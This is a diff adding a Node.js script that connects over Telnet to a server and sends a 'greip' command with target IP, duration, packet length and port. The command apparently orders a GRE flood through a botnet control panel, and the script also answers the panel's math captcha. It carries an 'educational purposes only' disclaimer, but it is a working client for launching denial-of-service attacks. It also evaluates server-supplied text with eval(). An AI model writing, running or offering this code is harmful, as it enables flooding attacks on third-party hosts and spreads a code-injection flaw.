@@ -1,0 +1,50 @@
+// Note: This script is for educational purposes only, and engaging in unauthorized access or any illegal activities is strongly discouraged.
+
+// Import required modules
+const net = require('net');
+
+// Function to connect to Telnet and execute commands
+const executeTelnetCommands = (ip, time, len, dport) => {
+  // Establish a connection to the Telnet server
+  const telnetSocket = net.createConnection({ port: 23, host: ip }, () => {
+    // Send the required Telnet commands
+    telnetSocket.write(`!greip ${ip} ${time} ${len} ${dport}\r\n`);
+  });
+
+  // Handle incoming data from the Telnet server
+  telnetSocket.on('data', (data) => {
+    // Assume the math captcha is included in the response
+    const mathCaptcha = extractMathCaptcha(data.toString());
+
+    // Solve the math captcha (replace this with your captcha-solving logic)
+    const solution = solveMathCaptcha(mathCaptcha);
+
+    // Send the solution back to the server
+    telnetSocket.write(`${solution}\r\n`);
+
+    // Close the connection
+    telnetSocket.end();
+  });
+
+  // Handle errors during the connection
+  telnetSocket.on('error', (err) => {
+    console.error(`Error: ${err.message}`);
+  });
+};
+
+// Function to extract the math captcha from the Telnet response
+const extractMathCaptcha = (telnetResponse) => {
+  // Implement logic to extract the captcha from the response
+  // Return the extracted captcha
+  return '2 + 2'; // Replace this with actual extraction logic
+};
+
+// Function to solve the math captcha
+const solveMathCaptcha = (captcha) => {
+  // Implement logic to solve the captcha
+  // Return the solution
+  return eval(captcha); // Use eval cautiously; replace with secure calculation logic
+};
+
+// Example usage
+executeTelnetCommands('example.com', '10', '100', '80');
